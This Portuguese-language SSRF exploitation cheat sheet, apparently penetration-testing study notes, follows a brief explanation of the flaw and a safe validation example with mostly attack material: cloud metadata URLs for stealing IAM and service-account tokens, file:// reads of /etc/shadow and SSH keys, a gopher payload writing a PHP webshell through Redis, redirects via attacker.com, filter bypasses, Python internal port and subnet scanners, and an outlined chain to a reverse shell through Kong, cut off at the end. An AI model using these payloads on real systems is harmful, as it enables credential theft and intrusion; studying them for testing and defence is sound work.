---
title: "SSRF"
---

# SSRF - Server-Side Request Forgery

## A Falha: Servidor Executa Requisições HTTP Controladas pelo Atacante

SSRF acontece quando uma aplicação aceita uma URL como parâmetro de entrada e faz uma requisição HTTP para essa URL sem restringir quais destinos são permitidos.

A suposição de design incorreta: o desenvolvedor imagina que a URL sempre apontará para um recurso externo legítimo — uma imagem em CDN, um feed RSS, uma API de terceiro. Não considera que o atacante pode apontar para `127.0.0.1`, para IPs da rede interna, ou para o serviço de metadata de cloud.

**Por que o desenvolvedor cria essa falha**: a funcionalidade faz sentido do ponto de vista de produto — "carregar imagem via URL", "importar feed RSS", "notificar webhook", "gerar preview de link". O código natural para isso é `requests.get(url)` ou `curl($url)`, onde `url` vem do parâmetro do usuário. A validação é frequentemente omitida porque o desenvolvedor raciocina sobre o caso de uso legítimo, não sobre o que o atacante pode fazer com o mesmo parâmetro.

**Consequência real**: o servidor vira um proxy para atacar infraestrutura invisível externamente. O atacante passa pelo firewall perimetral usando o servidor como intermediário — acessa admin panels internos, metadata de cloud com credenciais IAM, bancos de dados sem exposição externa, serviços de cache, e qualquer outro serviço acessível pela rede interna do servidor.

O caso mais grave: SSRF em instâncias AWS + IMDSv1 permite obter credenciais IAM temporárias e comprometer completamente a conta cloud. Foi o vetor do breach da Capital One (2019) — 100 milhões de registros.

---

## Causa Raiz

O padrão vulnerável é direto: a aplicação usa input do usuário como URL de destino de uma requisição, sem validar o destino.

```python
# VULNERÁVEL — requests.get() com URL do usuário sem validação
import requests
from flask import request, jsonify

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')           # atacante controla este valor
    response = requests.get(url)            # servidor faz requisição para onde o atacante mandar
    return jsonify({'content': response.text})

# Atacante envia: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Servidor faz GET para o metadata AWS e retorna as credenciais IAM para o atacante
```

```python
# SEGURO — whitelist de domínios permitidos + validação de IP resolvido
import requests
import socket
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = {'cdn.empresa.com', 'feeds.parceiro.com'}
BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),   # link-local / metadata AWS
    ipaddress.ip_network('::1/128'),
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    # Validar IP resolvido — não apenas o hostname (evita DNS rebinding)
    try:
        resolved_ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        for blocked in BLOCKED_RANGES:
            if resolved_ip in blocked:
                return False
    except Exception:
        return False
    return True

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    if not is_safe_url(url):
        return jsonify({'error': 'URL não permitida'}), 400
    response = requests.get(url, allow_redirects=False)   # não seguir redirects
    return jsonify({'content': response.text})
```

O que está faltando na versão vulnerável: o destino da URL não é validado antes de a requisição ser feita; IPs privados e link-local não são bloqueados após resolução DNS (o que expõe a vulnerabilidade a DNS rebinding); apenas schemas `http` e `https` deveriam ser aceitos, excluindo `file://`, `gopher://` e similares; e redirects automáticos não devem ser seguidos, pois podem redirecionar para IPs internos contornando a validação inicial.

---

## Como o Ataque Funciona

```
Atacante                  Servidor Alvo              Recurso Interno
   |                           |                           |
   |-- GET /?url=http://       |                           |
   |   internal.host/admin --> |                           |
   |                           |-- GET /admin -----------> |
   |                           |                           |
   |                           |<-- 200 OK + conteúdo --  |
   |<-- resposta com conteúdo--|
   |   interno visível         |
```

Fluxo típico:
1. Aplicação recebe URL como parâmetro (`?url=`, `?path=`, `?dest=`, `?redirect=`, `?img=`)
2. Servidor faz requisição para essa URL usando curl, urllib, requests, fetch, etc.
3. Resposta é retornada ao atacante ou usada internamente
4. Sem validação adequada: qualquer URL funciona — incluindo `127.0.0.1`, IPs privados, schemas alternativos

Vetores comuns de entrada:
- Parâmetros URL explícitos: `?url=`, `?fetch=`, `?src=`, `?href=`
- Webhooks e callbacks: `?webhook=`, `?callback=`
- Import de arquivos: carregar imagem via URL, importar RSS feed
- PDF generators: wkhtmltopdf, PhantomJS — fazem fetch de URLs antes de renderizar
- Validação de SSL/certificate pinning: validar domínio faz lookup
- APIs de preview: geração de thumbnail, Open Graph scrapers

---

## Identificação

### Parâmetros Suspeitos

```
# Parâmetros clássicos que processam URLs
url=, src=, href=, path=, dest=, redirect=, uri=, page=
fetch=, load=, target=, data=, ip=, host=, to=, from=
ref=, link=, file=, resource=, next=, continue=, open=
callback=, return=, endpoint=, api=, proxy=
```

### Testes Iniciais de SSRF

```bash
# Teste básico: localhost
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://0.0.0.0/

# Porta não padrão (detectar serviço interno)
?url=http://127.0.0.1:8080/
?url=http://127.0.0.1:8443/
?url=http://127.0.0.1:9200/   # Elasticsearch
?url=http://127.0.0.1:6379/   # Redis (texto)
?url=http://127.0.0.1:27017/  # MongoDB

# Rede interna RFC1918
?url=http://192.168.1.1/
?url=http://10.0.0.1/
?url=http://172.16.0.1/
```

### Detecção via Diferença de Resposta

| Comportamento                       | Interpretação                          |
|-------------------------------------|----------------------------------------|
| Resposta diferente para 80 vs 8080  | SSRF confirmado, porta aberta/fechada  |
| Timeout em portas fechadas          | SSRF confirmado                        |
| Connection refused em portas fecha  | SSRF confirmado                        |
| Resposta idêntica independente      | Provável filtragem ou SSRF inexistente |
| DNS resolution mas sem HTTP         | Blind SSRF ou filtragem de IP          |

### Port Scanning via SSRF

```bash
# Diferença de tempo/resposta por porta
for port in 21 22 25 80 443 3306 5432 6379 8080 8443 9200 27017; do
  curl -s "https://alvo.com/fetch?url=http://127.0.0.1:$port/" &
done

# Interpretar: porta aberta = resposta rápida ou conteúdo
# porta fechada = connection refused / timeout diferente
```

### Blind SSRF - Detecção por DNS/HTTP Callback

```bash
# Usar interactsh ou Burp Collaborator
?url=http://SEU-ID.oast.fun/
?url=http://SEU-ID.burpcollaborator.net/

# Se DNS query chegar = servidor resolveu o hostname
# Se HTTP request chegar = SSRF funcional confirmado
```

---

## Exploitation

### SSRF Básico - Acesso a Admin Interno

```http
GET /api/fetch?url=http://127.0.0.1/admin HTTP/1.1
Host: alvo.com

GET /api/fetch?url=http://127.0.0.1:8080/manager/html HTTP/1.1
Host: alvo.com

GET /proxy?url=http://internal.corp.com/secret HTTP/1.1
Host: alvo.com
```

### AWS Metadata Service (IMDSv1)

```bash
# Endpoint de metadata AWS
http://169.254.169.254/latest/meta-data/

# IAM credentials (o jackpot)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Resposta com credenciais temporárias:
# {
#   "Code": "Success",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-01-01T00:00:00Z"
# }

# Outros dados úteis
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/network/interfaces/
http://169.254.169.254/latest/user-data/          # scripts de inicialização
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### AWS IMDSv2 (Token-Based)

```bash
# IMDSv2 requer token em dois passos
# Passo 1: obter token (PUT request com TTL)
# Passo 2: usar token no header X-aws-ec2-metadata-token

# Via SSRF com suporte a headers customizados:
# PUT http://169.254.169.254/latest/api/token
# X-aws-ec2-metadata-token-ttl-seconds: 21600

# Depois: GET com header X-aws-ec2-metadata-token: <token>

# Se SSRF só suporta GET: IMDSv2 bloqueia sem PUT inicial
# Workaround: alguns apps vulneráveis adicionam headers customizados
```

### GCP Metadata Service

```bash
# GCP usa header obrigatório: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/

# Instâncias GCP — se aplicação envia header automaticamente:
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Sem header, algumas versões aceitam:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Metadata Service (IMDS)

```bash
# Azure IMDS — header obrigatório: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Managed Identity token (equivalente a IAM credentials)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Sem header pode falhar, mas vale tentar:
http://169.254.169.254/metadata/v1/maintenance
```

### Oracle Cloud Metadata

```bash
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/identity/
http://169.254.169.254/opc/v2/instance/
```

### DigitalOcean Metadata

```bash
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

---

## Protocol Abuse

### file:// - Leitura de Arquivos Locais

```bash
?url=file:///etc/passwd
?url=file:///etc/shadow
?url=file:///etc/hosts
?url=file:///proc/self/environ
?url=file:///proc/self/cmdline
?url=file:///proc/net/tcp
?url=file:///var/www/html/config.php
?url=file:///home/user/.ssh/id_rsa
?url=file:///root/.bash_history

# Windows
?url=file:///C:/Windows/System32/drivers/etc/hosts
?url=file:///C:/inetpub/wwwroot/web.config
?url=file:///C:/Users/Administrator/Desktop/proof.txt
```

### dict:// - Interação com Serviços de Dicionário

```bash
# Fingerprint de serviços TCP via banner grabbing
?url=dict://127.0.0.1:6379/INFO      # Redis info
?url=dict://127.0.0.1:11211/stats    # Memcached stats
?url=dict://127.0.0.1:22/           # SSH banner
?url=dict://127.0.0.1:25/           # SMTP banner
```

### gopher:// - Protocolo de Propósito Geral (Mais Poderoso)

Gopher permite enviar dados arbitrários TCP brutos. Ideal para interagir com protocolos sem HTTP.

```
gopher://IP:PORT/_DADOS_URL_ENCODED
```

O underscore `_` é separador obrigatório. Dados são URL-encoded após ele.

```bash
# Enviar linha simples para Redis (PING)
?url=gopher://127.0.0.1:6379/_PING%0D%0A

# Resultado esperado: +PONG
```

### gopher:// para Redis - Escrita de Webshell

```bash
# Payload gopher para Redis SET + SAVE
# Comandos Redis:
# FLUSHALL
# SET CHAVE "<?php system($_GET['cmd']); ?>"
# CONFIG SET dir /var/www/html
# CONFIG SET dbfilename shell.php
# SAVE

# URL-encoded (cada linha termina com \r\n = %0D%0A)
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp+system%28%24_GET%5Bcmd%5D%29%3B+%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# Usar Gopherus para gerar payloads automaticamente:
# python3 gopherus.py --exploit redis
```

### gopher:// para HTTP Interno (POST Request)

```bash
# Construir POST request HTTP via gopher
# Simula fazer um POST para endpoint interno sem CORS ou auth externa

# POST /admin/update HTTP/1.1\r\n
# Host: 127.0.0.1\r\n
# Content-Type: application/x-www-form-urlencoded\r\n
# Content-Length: 20\r\n
# \r\n
# user=admin&admin=true

# URL-encoded para gopher:
?url=gopher://127.0.0.1:80/_POST%20%2Fadmin%2Fupdate%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2020%0D%0A%0D%0Auser%3Dadmin%26admin%3Dtrue
```

### gopher:// para SMTP

```bash
# Enviar email via SSRF + gopher para SMTP interno
# python3 gopherus.py --exploit smtp
?url=gopher://127.0.0.1:25/_EHLO%20localhost%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0ARCPT%20TO%3A%3Cadmin%40internal.com%3E%0D%0ADATA%0D%0ASubject%3A%20Test%0D%0A%0D%0AMessage%20body%0D%0A.%0D%0AQUIT%0D%0A
```

### sftp:// - SSH File Transfer

```bash
?url=sftp://attacker.com:11111/
# Servidor SSRF conecta em sftp, vaza versão do cliente SSH
# Útil para fingerprinting
```

### ldap:// - LDAP via SSRF

```bash
?url=ldap://127.0.0.1:389/
?url=ldap://127.0.0.1:389/dc=corp,dc=com
# Pode enumerar entradas LDAP se aplicação processa resposta
```

### tftp:// - Leitura/Escrita Trivial

```bash
?url=tftp://attacker.com/TESTFILE
# Servidor alvo tenta buscar TESTFILE do servidor TFTP do atacante
# Confirma SSRF, pode exfiltrar dados via nome do arquivo
```

---

## Gopherus - Geração Automática de Payloads

```bash
# Instalar
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
pip3 install -r requirements.txt

# Uso básico
python3 gopherus.py --exploit redis
python3 gopherus.py --exploit smtp
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit zabbix
python3 gopherus.py --exploit tomcat
python3 gopherus.py --exploit shellshock

# Exemplo Redis - gerar payload para webshell PHP
python3 gopherus.py --exploit redis
# Prompt: path to webshell? /var/www/html/
# Prompt: shell filename? shell.php
# Output: gopher://127.0.0.1:6379/_%2A1...
```

---

## Bypass

### Bypass de Validação de IP - Representações Alternativas

```bash
# Decimal notation (127.0.0.1 em decimal)
?url=http://2130706433/          # 127.0.0.1 em inteiro decimal
?url=http://0x7f000001/          # 127.0.0.1 em hexadecimal
?url=http://0177.0.0.1/          # 127.0.0.1 em octal
?url=http://0x7f.0x0.0x0.0x1/   # hex por octeto

# Representações de 127.0.0.1
?url=http://127.1/               # notação abreviada
?url=http://127.0.1/
?url=http://0/                   # 0.0.0.0 = 127.0.0.1 em alguns SOs
?url=http://000/

# Representações de 169.254.169.254 (AWS metadata)
?url=http://2852039166/          # decimal
?url=http://0xa9fea9fe/          # hex
?url=http://0251.0376.0251.0376/ # octal por octeto
```

### Bypass via IPv6

```bash
# Loopback IPv6
?url=http://[::1]/               # ::1 = 127.0.0.1
?url=http://[0:0:0:0:0:0:0:1]/

# IPv4-mapped IPv6
?url=http://[::ffff:127.0.0.1]/
?url=http://[::ffff:7f00:1]/
?url=http://[0000::1]/
```

### Bypass via Encoding de URL

```bash
# Double URL encoding
?url=http://127.0.0.1%2F%2F     # / duplo
?url=http://%31%32%37%2e%30%2e%30%2e%31/  # 127.0.0.1 URL-encoded
?url=http://127%2e0%2e0%2e1/    # pontos URL-encoded

# Null byte e caracteres especiais
?url=http://127.0.0.1%00.evil.com/   # null byte trunca hostname
?url=http://127.0.0.1%09/       # tab
?url=http://127.0.0.1%23/       # # (fragmento)
```

### Bypass via User-Info em URL

```bash
# Formato: scheme://user:password@host/path
# Validação verifica o "host" mas parse usa outro componente

?url=http://169.254.169.254@evil.com/
# Parser HTTP pode mandar req para evil.com com credencial 169.254.169.254

?url=http://evil.com#@169.254.169.254/latest/meta-data/
# Fragmento confunde validação baseada em split('#')

?url=http://evil.com?@169.254.169.254/
# Query string confunde validação baseada em split('?')

# User-info para bypass de whitelist de domínio:
?url=http://allowed-domain.com@169.254.169.254/
# Validação vê "allowed-domain.com", curl/requests vai para 169.254.169.254
```

### Bypass via Redirect HTTP

```bash
# Fazer servidor externo controlado retornar 301/302 para IP interno

# Servidor PHP do atacante:
<?php
header("Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/");
exit;
?>

# Depois: ?url=http://attacker.com/redirect.php
# Servidor faz GET para attacker.com, recebe 301, segue para metadata
```

### Bypass via Protocolo Schema

```bash
# Algumas validações só bloqueiam "http" mas não variações
?url=HTTP://127.0.0.1/      # maiúsculas
?url=hTTp://127.0.0.1/      # mixed case
?url=http+ssl://127.0.0.1/

# Tentar schemas não HTTP se aplicação usa biblioteca genérica:
?url=dict://127.0.0.1:6379/INFO
?url=sftp://attacker.com/
?url=gopher://127.0.0.1:6379/
```

### Bypass via DNS - Domínio Resolvendo para IP Interno

```bash
# Registrar subdomínio que resolve para 127.0.0.1
# Serviços de teste:
# - localtest.me: *.localtest.me -> 127.0.0.1
# - lvh.me: *.lvh.me -> 127.0.0.1
# - nip.io: 127.0.0.1.nip.io -> 127.0.0.1
# - xip.io: 127.0.0.1.xip.io -> 127.0.0.1

?url=http://127.0.0.1.nip.io/       # resolve para 127.0.0.1
?url=http://127.0.0.1.localtest.me/ # resolve para 127.0.0.1

# Para metadata AWS:
?url=http://169.254.169.254.nip.io/latest/meta-data/
```

### Bypass de Whitelist de Domínio

```bash
# Aplicação permite apenas *.empresa.com

# Path traversal no hostname:
?url=http://empresa.com/..@169.254.169.254/

# Subdomínio que resolve para interno:
?url=http://internal.empresa.com/admin  # se empresa.com tem subdomínio apontando para rede interna
```

### Bypass via DNS Rebinding

```bash
# Técnica para bypass de validação baseada em resolução DNS
# 1. Registrar domínio com TTL muito baixo (< 1s)
# 2. Resolver domínio para IP externo na primeira requisição (passa validação)
# 3. Servidor faz requisição, DNS já rebindou para 169.254.169.254
# 4. Firewall/filtro já validou, mas requisição vai para IP interno

# Serviços de DNS rebinding:
# - rbndr.us: 0a00.0101.rbndr.us (alterna entre 10.0.0.1 e 1.1.1.1)
# - 1u.ms: ferramenta customizável
# - singularity of origin: framework completo

# Exemplo com rbndr.us (exige timing certo):
?url=http://A9FEA9FE.7f000001.rbndr.us/  # alterna entre 169.254.169.254 e 127.0.0.1
```

---

## Blind SSRF

### Conceito

Resposta não é refletida. Confirmação via efeito colateral (DNS lookup, callback HTTP, erro de rede).

```bash
# Ferramentas de callback
# interactsh (open source):
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Gera URL tipo: abc123.oast.fun

# Burp Collaborator (Burp Suite Professional)
# Gera URL tipo: abc123.burpcollaborator.net

# requestbin.com / webhook.site
# Para teste rápido sem setup
```

### Detecção Blind SSRF

```bash
# DNS-only: confirma resolução de hostname
?url=http://SEU-ID.oast.fun/test

# HTTP: confirma requisição completa
?url=http://SEU-ID.oast.fun/ssrf-test

# Timing: se porta fechada vs aberta tem tempo diferente
import time, requests

for port in [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 9200]:
    start = time.time()
    requests.get(f"https://alvo.com/fetch?url=http://127.0.0.1:{port}/", timeout=3)
    elapsed = time.time() - start
    print(f"Port {port}: {elapsed:.2f}s")
```

### SSRF via Webhook / Import de URL

```bash
# Apps com webhook geralmente permitem SSRF direto
# Registrar webhook apontando para metadata:
{
  "webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# Importar conteúdo via URL:
{
  "import_url": "http://192.168.1.100/admin/backup.sql"
}
```

### SSRF em PDF Generators

```bash
# wkhtmltopdf faz fetch da URL antes de renderizar
# Injetar tags HTML maliciosas no conteúdo gerado

# Se aplicação gera PDF de conteúdo fornecido pelo usuário:
# Incluir iframe apontando para recurso interno:
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000">
</iframe>

# Ou via img tag:
<img src="http://169.254.169.254/latest/meta-data/">

# Ou via XMLHttpRequest em ambiente que executa JS (PhantomJS):
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://169.254.169.254/latest/meta-data/", false);
xhr.send();
// resultado acessível em xhr.responseText
```

### SSRF Parcial (Open Redirect para Metadata)

```bash
# Aplicação valida hostname mas segue redirects
# Encadear open redirect em domínio permitido para metadata

# 1. Encontrar open redirect em domínio permitido:
https://trusted.com/redirect?url=http://169.254.169.254/

# 2. Usar como URL no parâmetro vulnerável:
?url=https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Ferramentas

### SSRFmap

```bash
# Automatiza detecção e exploração de SSRF
git clone https://github.com/swisskyrepo/SSRFmap
pip3 install -r requirements.txt

# Uso básico
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m metadata_aws
python3 ssrfmap.py -r request.txt -p url -m metadata_gcp
python3 ssrfmap.py -r request.txt -p url -m redis

# Módulos disponíveis:
# portscan, networkscan, readfiles, alibaba, aws, aws_cognito
# azure, digitalocean, fastcgi, gcp, gopher, iptables
# logspoofer, memcache, mongo, mysql, oracle, redis
# smtp, zabbix

# Arquivo request.txt: dump do Burp com parâmetro alvo marcado
```

### Gopherus

```bash
git clone https://github.com/tarunkant/Gopherus
cd Gopherus && pip3 install -r requirements.txt

# Exploits:
python3 gopherus.py --exploit redis
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit smtp
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit tomcat
python3 gopherus.py --exploit zabbix
python3 gopherus.py --exploit shellshock
```

### interactsh

```bash
# Servidor de callback para blind SSRF
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

interactsh-client
# Output:
# [INF] Listing on https://abc123.oast.fun
# [INF] [dns] Received DNS interaction...
# [INF] [http] Received HTTP interaction...
```

### ffuf para Brute Force de Endpoints Internos

```bash
# Varredura de portas com wordlist
ffuf -u "https://alvo.com/fetch?url=http://127.0.0.1:FUZZ/" \
     -w /usr/share/wordlists/ports.txt \
     -fc 200 -fl 0

# Wordlist de paths de admin internos
ffuf -u "https://alvo.com/fetch?url=http://127.0.0.1/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302
```

### curl para Testes Manuais

```bash
# Simular SSRF localmente para testar payload gopher
curl -s "gopher://127.0.0.1:6379/_PING%0D%0A"

# Verificar timeout vs connection refused
curl -s --max-time 1 "http://127.0.0.1:12345/" -v 2>&1 | grep "connect"

# Seguir redirects (simula comportamento de app)
curl -L -s "http://alvo.com/fetch?url=http://attacker.com/redirect"
```

---

## Casos Especiais e Variantes

### SSRF via APIs REST / GraphQL

```bash
# GraphQL com query que faz fetch externo
{
  "query": "{ importFromUrl(url: \"http://169.254.169.254/latest/meta-data/\") }"
}

# API com campo URL em body JSON
POST /api/v1/webhook
Content-Type: application/json

{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

### SSRF via Header HTTP

```bash
# Alguns apps fazem proxy para URL em headers customizados
X-Forwarded-For: 127.0.0.1
X-Real-IP: 169.254.169.254
X-Custom-IP-Authorization: 127.0.0.1
X-Forward: http://internal.host/admin
Forwarded: for=127.0.0.1;host=internal.corp.com

# Host header injection se servidor faz fetch do próprio host
Host: internal.host.com
```

### SSRF + SSTI (Combinação Perigosa)

{% raw %}
```bash
# Aplicação busca URL e renderiza conteúdo em template
# 1. Criar servidor com conteúdo SSTI
# 2. Fazer SSRF buscar esse conteúdo
# 3. Template engine do servidor executa payload

# Servidor do atacante retorna:
{{ 7*7 }}  # ou payload de RCE completo

# Via SSRF:
?url=http://attacker.com/ssti-payload.txt
```
{% endraw %}

---

## Detecção e Mitigação

### Padrões em Logs

```bash
# Nos logs do servidor vítima: requisições de saída inesperadas
169.254.169.254 - - [timestamp] "GET /latest/meta-data/ HTTP/1.1" 200
127.0.0.1 - - [timestamp] "GET /admin HTTP/1.1" 200

# Grep nos access logs de serviços internos:
grep "169.254.169.254" /var/log/nginx/access.log
grep "127.0.0.1" /var/log/apache2/access.log | grep -v "::1"

# Monitorar conexões de saída suspeitas:
ss -tnp | grep :6379  # conexão ao Redis
netstat -antp | grep ESTABLISHED | grep :25  # SMTP de saída
```

### Mitigações

```
1. Whitelist de URLs/domínios permitidos
   Rejeitar tudo que não está na lista explícita

2. Bloquear IPs privados APÓS resolução DNS
   Resolver o hostname e verificar o IP resultante
   Bloquear: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
   Bloquear: 127.0.0.0/8, 169.254.0.0/16, ::1

3. Desabilitar schemas desnecessários
   Só permitir http:// e https://
   Bloquear: file://, gopher://, dict://, sftp://, ftp://

4. Não seguir redirects automaticamente
   Ou validar destino do redirect antes de seguir

5. IMDSv2 obrigatório em AWS (mitiga SSRF em EC2)
   Requer token via PUT antes de GET

6. Resposta não deve ser retornada ao usuário diretamente
   Processar internamente sem refletir conteúdo

7. Firewall de saída na aplicação
   Bloquear conexões de saída do processo para IPs privados
```

### IMDSv2 no AWS (Mitigação Definitiva)

```bash
# Forçar IMDSv2 via CLI AWS:
aws ec2 modify-instance-metadata-options \
  --instance-id i-XXXX \
  --http-tokens required \
  --http-put-response-hop-limit 1

# Com IMDSv2: SSRF simples (GET) não consegue mais credenciais
# Requer PUT para obter token primeiro
# Hop limit 1: somente a instância pode acessar (não containers internos)
```

---

## Quick Reference

| Alvo                  | URL                                                                            |
|-----------------------|--------------------------------------------------------------------------------|
| Localhost             | `http://127.0.0.1/`                                                            |
| AWS metadata IAM      | `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE`       |
| GCP token             | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` |
| Azure managed identity| `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...` |
| Arquivo local         | `file:///etc/passwd`                                                            |
| Redis via gopher      | `gopher://127.0.0.1:6379/_PING%0D%0A`                                         |
| Dict banner grab      | `dict://127.0.0.1:22/`                                                         |
| 127.0.0.1 em decimal  | `http://2130706433/`                                                            |
| 169.254.169.254 hex   | `http://0xa9fea9fe/`                                                            |
| nip.io bypass         | `http://127.0.0.1.nip.io/`                                                     |

---

## Checklist de Exploração SSRF

```
[ ] Identificar parâmetros que aceitam URLs
[ ] Confirmar SSRF com callback DNS (interactsh)
[ ] Testar acesso a localhost e IPs privados
[ ] Varrer portas internas (portscan)
[ ] Tentar metadata de cloud (AWS/GCP/Azure)
[ ] Tentar schemas alternativos (file://, gopher://, dict://)
[ ] Se filtro: tentar bypasses de IP e domínio
[ ] Blind SSRF: confirmar via timing ou DNS
[ ] Gopherus para Redis/MySQL/SMTP se portas abertas
[ ] Documentar credenciais obtidas de metadata
```

---

---

## Blind SSRF — Error Oracle para Port Scanner (AWAE Ch.12)

Quando o SSRF não reflete a resposta, diferentes mensagens de erro revelam o estado da porta.

### Classificação por Resposta

| Resposta do app | Significado |
|---|---|
| `FORBIDDEN` / erro de permissão | Porta **aberta**, recurso válido mas acesso negado |
| `ECONNREFUSED` | Host **vivo**, porta **fechada** |
| `timeout` após ~60s | Host **não existe** na rede |
| `EHOSTUNREACH` | Host fora da subnet alcançável |

### Oracle de Timing

```
porta fechada → ECONNREFUSED imediato ≈ 178ms
host inválido → timeout ≈ 60s
```

### Port Scanner via SSRF

```python
# ssrf_port_scanner.py
import requests, time

TARGET = "https://APP/files/import"
INTERNAL_HOST = "172.16.16.1"
PORTS = [21, 22, 80, 443, 3306, 5432, 6379, 8001, 8080, 8055, 9000]

for port in PORTS:
    url = f"http://{INTERNAL_HOST}:{port}"
    start = time.time()
    try:
        r = requests.post(TARGET, json={"url": url}, timeout=5)
        elapsed = time.time() - start
        body = r.text.lower()

        if "forbidden" in body or "permission" in body:
            status = "OPEN (recurso válido, acesso negado)"
        elif "econnrefused" in body or "connection refused" in body:
            status = "CLOSED"
        elif elapsed > 4:
            status = "FILTERED/NO HOST"
        else:
            status = f"OPEN? ({r.status_code})"
    except requests.Timeout:
        status = "TIMEOUT (host inválido)"

    print(f"{port:5d}: {status}")
```

---

## Blind SSRF — Subnet Scanner + Host Enumeration (AWAE Ch.12)

### Estratégia

Scan de gateways (`.x.x.1`) é mais eficiente que varrer IPs completos:
- Ranges privados: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- Se o app roda em `172.16.X.Y`, o gateway do subnet é `172.16.X.1`

### Gateway Scanner — 172.16.0.0/12

```python
# ssrf_gateway_scanner.py
import requests

TARGET = "https://APP/files/import"
PORT = 80

found = []
for b in range(16, 32):        # segundo octeto: 172.16.x - 172.31.x
    for c in range(0, 256):    # terceiro octeto
        ip = f"172.{b}.{c}.1"
        r = requests.post(TARGET, json={"url": f"http://{ip}:{PORT}"}, timeout=3)
        if "timeout" not in r.text.lower() and "ehostunreach" not in r.text.lower():
            print(f"[+] SUBNET ATIVA: 172.{b}.{c}.x")
            found.append(f"172.{b}.{c}")
```

### Host Scanner — Subnet Identificado

```python
# ssrf_subnet_scanner.py
import requests

TARGET = "https://APP/files/import"
SUBNET = "172.16.16"   # substituir pelo subnet encontrado
PORTS = [22, 80, 443, 5432, 6379, 8001, 8055, 9000]

for host_octet in range(1, 255):
    ip = f"{SUBNET}.{host_octet}"
    for port in PORTS:
        r = requests.post(TARGET, json={"url": f"http://{ip}:{port}"}, timeout=3)
        body = r.text.lower()
        if "econnrefused" not in body and "timeout" not in body:
            print(f"[+] {ip}:{port} — {r.text[:80]}")
```

### Portas de Interesse

| Porta | Serviço típico |
|-------|---------------|
| 8001 | Kong Admin API |
| 5432 | PostgreSQL |
| 6379 | Redis |
| 8055 | Directus |
| 9000 | Render Service (Puppeteer/PDF) |

---

## SSRF → Headless Chrome → Kong Admin API RCE (AWAE Ch.12)

### Cadeia Completa

```
Endpoint SSRF (/files/import)
  → Render Service interno (Puppeteer/URL-to-PDF, porta 9000)
  → Headless Chrome carrega URL do attacker
  → JS executa no contexto do Chrome interno
  → fetch() para Kong Admin API (porta 8001 — sem auth interna)
  → Criar service + route + pre-function plugin com Lua
  → Request para nova rota dispara Lua → reverse shell
```

### Verificar Kong Pre-function Plugin

```bash
# via SSRF para Kong Admin API
